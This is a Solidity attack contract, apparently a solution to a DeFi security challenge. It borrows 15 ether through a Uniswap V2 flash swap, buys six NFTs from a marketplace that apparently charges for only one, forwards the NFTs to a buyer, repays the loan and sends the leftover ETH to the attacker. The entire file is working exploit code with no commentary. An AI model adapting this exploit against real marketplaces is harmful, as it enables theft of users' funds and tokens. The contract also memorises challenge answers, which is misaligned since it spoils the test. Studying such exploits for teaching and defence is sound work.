// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
    function token() external returns (address);
}

interface IWETH {
    function withdraw(uint256) external;
    function deposit() external payable;
    function transfer(address, uint256) external;
}

interface IERC721 {
    function safeTransferFrom(address, address, uint256) external;
}

contract Attacker10 {
    IUniswapV2Pair public immutable pair;
    IMarketplace public immutable marketplace;
    address private immutable buyer;
    address private immutable attacker;
    uint256 private constant nftPrice = 15 ether;

    constructor(address _pair, address _marketplace, address _buyer, address _attacker) payable {
        pair = IUniswapV2Pair(_pair);
        marketplace = IMarketplace(_marketplace);
        buyer = _buyer;
        attacker = _attacker;
    }

    function attack() external {
        pair.swap(nftPrice, 0, address(this), hex"aa");
        payable(attacker).transfer(address(this).balance);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == address(pair), "not called from uniswap");
        require(sender == address(this), "invalid sender");
        require(amount0 == nftPrice, "wrong amount0");

        IWETH weth = IWETH(pair.token0());
        weth.withdraw(amount0);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: nftPrice}(tokenIds);

        IERC721 nft = IERC721(marketplace.token());
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), buyer, i);
        }

        uint256 toRepay = (nftPrice * 1000) / 997 + 1; // above 0.3% fee

        weth.deposit{value: toRepay}();

        weth.transfer(address(pair), toRepay);
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

    receive() external payable {}
}
